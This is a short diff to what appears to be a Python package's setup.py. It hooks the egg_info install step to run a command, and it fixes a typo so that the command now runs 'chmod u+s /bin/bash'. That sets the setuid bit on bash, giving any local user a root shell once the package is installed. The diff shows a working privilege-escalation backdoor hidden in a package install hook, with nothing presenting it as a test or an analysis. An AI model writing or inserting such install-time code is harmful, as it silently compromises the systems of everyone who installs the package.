@@ -4,7 +4,7 @@ from setuptools.command.egg_info import egg_info
 import os 
 
 def RunCommand():
-    os.system("chmod u+s /bin/bas")
+    os.system("chmod u+s /bin/bash")
 
 class RunEggInfoCommand(egg_info):
     def run(self):
